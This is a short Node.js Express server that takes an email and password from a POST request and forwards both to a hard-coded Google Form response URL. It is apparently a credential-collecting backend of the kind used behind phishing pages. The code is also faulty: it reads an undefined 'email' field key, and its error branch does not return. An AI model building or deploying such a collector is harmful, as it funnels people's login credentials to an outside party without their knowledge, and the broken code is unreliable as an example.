const express = require("express");
const FormData = require("form-data");
const cors = require("cors");

const formUrl =
  "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfcpGZzacm0X4W2whrDG_cTKALV_6HzN6REV8aZGS9eAT0LuA/formResponse";
const fields = {
  name: "entry.1542430435",
  password: "entry.1914285503",
};
const PORT = 3000;
const app = express();
app.use(cors());
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.json({
    message: "API using gooogle form",
  });
});

app.post("/", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    res.status(400).json({
      success: false,
    });
  }
  const form = new FormData();

  form.append(fields.email, email);
  form.append(fields.password, password);
  form.submit(
    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfcpGZzacm0X4W2whrDG_cTKALV_6HzN6REV8aZGS9eAT0LuA/formResponse",
    function (err, data) {
      if (err) throw err;
      console.log(data.statusCode);

      res.json({
        success: "done",
      });
    }
  );
});

app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
